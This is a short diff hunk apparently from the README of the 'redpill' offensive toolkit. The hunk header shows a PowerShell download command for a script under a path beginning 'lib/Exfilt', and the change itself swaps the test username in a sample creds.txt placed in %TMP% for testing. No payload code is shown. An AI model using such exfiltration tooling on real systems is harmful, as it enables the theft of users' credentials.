@@ -212,8 +212,8 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfilt
 
 **Create creds.txt on %TMP% for tests**
 ```
+username=pedroUbuntu
 password=r00t3xp10it
-username=pedroNobrega
 ```
 
 **execute:**
